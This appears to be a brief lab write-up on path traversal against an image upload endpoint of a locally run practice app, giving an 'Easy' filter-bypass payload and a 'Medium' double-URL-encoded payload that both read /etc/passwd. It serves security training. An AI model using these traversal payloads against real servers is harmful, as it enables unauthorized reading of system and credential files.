## Path Traversal

Bug in `http://localhost:3000/upload?image=`

![img.png](img.png)

### Easy

`http://localhost:3000/upload?image=....//....//....//....//etc/passwd`

![img_1.png](img_1.png)

### Medium

Use double URL Encode

`..%252F..%252F..%252F..%252Fetc%252Fpasswd`

